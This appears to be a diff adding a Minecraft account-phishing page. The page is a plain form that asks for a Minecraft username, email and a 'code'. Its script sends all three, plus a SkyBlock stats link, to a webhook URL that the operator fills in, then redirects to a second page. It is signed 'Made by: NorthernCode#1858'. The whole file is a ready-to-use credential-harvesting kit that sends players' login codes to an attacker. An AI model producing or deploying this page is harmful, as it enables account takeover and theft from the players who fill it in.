@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Webhook Form</title>
+</head>
+<body>
+  <h1>Webhook Form</h1>
+  <form id="webhookForm">
+    <label for="username">Minecraft Username:</label>
+    <input type="text" id="username" name="username" required><br><br>
+    <label for="email">Email:</label>
+    <input type="email" id="email" name="email" required><br><br>
+    <label for="code">Please enter the code below:</label>
+    <input type="text" id="code" name="code" required><br><br>
+    <input type="submit" value="Send Message">
+  </form>
+
+  <script>
+    document.getElementById("webhookForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // prevent the form from reloading the page
+
+      // get the input values
+      const username = document.getElementById('username').value;
+      const email = document.getElementById('email').value;
+      const code = document.getElementById('code').value;
+
+      // create the webhook message
+      const message = {
+        "content": "Made by: NorthernCode#1858",
+        "embeds": [
+          {
+            "color": null,
+            "fields": [
+              {
+                "name": "Minecraft Username:",
+                "value": username
+              },
+              {
+                "name": "Email:",
+                "value": email
+              },
+              {
+                "name": "Code:",
+                "value": code
+              },
+              {
+                "name": "SkyBlock Stats:",
+                "value": "https://sky.shiiyu.moe/stats/" + username
+              }
+            ]
+          }
+        ]
+      };
+
+      // make an HTTP POST request to the webhook URL with the data
+      const webhookUrl = "YOUR_WEBHOOK_URL"; // Replace with your actual webhook URL
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", webhookUrl, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+          if (xhr.status === 200) {
+            console.log("Webhook sent successfully!");
+          } else {
+            console.error("Failed to send webhook:", xhr.statusText);
+          }
+        }
+      };
+      xhr.send(JSON.stringify(message));
+      setTimeout(function() {
+        window.location.href = "code.html";
+      }, 750);
+    });
+  </script>
+</body>
+</html>
